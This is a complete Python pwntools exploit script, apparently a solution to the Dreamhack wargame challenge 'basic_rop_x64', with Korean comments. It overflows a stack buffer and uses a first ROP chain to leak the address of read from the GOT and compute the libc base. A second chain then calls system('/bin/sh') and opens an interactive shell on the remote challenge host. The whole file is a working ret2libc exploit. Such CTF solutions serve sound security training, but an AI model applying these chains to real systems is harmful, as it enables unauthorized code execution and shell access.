from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'


p = remote('host3.dreamhack.games', 21464)
e = ELF('./basic_rop_x64')
#로컬에서 안된다면 ldd ./file을 함으로 어디서 라이브러리를 참조하는지 확인
libc = ELF('./libc.so.6', checksec=False)
r = ROP(e)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols['main']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
sh = list(libc.search(b'/bin/sh'))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# first
payload = b'a'*0x48

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

p.recvuntil(b'a'*0x40)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = lb + sh

log.info(f'read: {hex(read)}')
log.info(f'libc base: {hex(lb)}')
log.info(f'system: {hex(system)}')
log.info(f'/bin/sh: {hex(binsh)}')

#여기까지 libc의 base주소, system, /bin/sh 주소를 구함
#34번째 줄을 보면 main을 재실행하게 해서 second에서 system(/bin/sh를 실행) 

# second
payload = b'a'*0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)

p.interactive()